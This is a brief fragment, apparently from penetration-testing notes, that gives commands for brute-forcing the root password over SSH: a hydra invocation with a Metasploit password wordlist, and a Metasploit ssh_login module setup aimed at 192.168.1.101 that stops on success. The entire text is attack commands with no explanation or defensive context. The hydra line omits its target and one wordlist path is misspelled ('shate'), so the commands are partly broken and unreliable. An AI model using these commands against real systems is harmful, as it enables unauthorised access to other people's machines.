`hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -T 4 -V -f`

or using metasploit
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.101
set USER root
set PASS_FILE /usr/shate/wordlists/metasploit/unix_passwords.txt
set STOP_ON_SUCCESS true
set THREADS 10
run
```
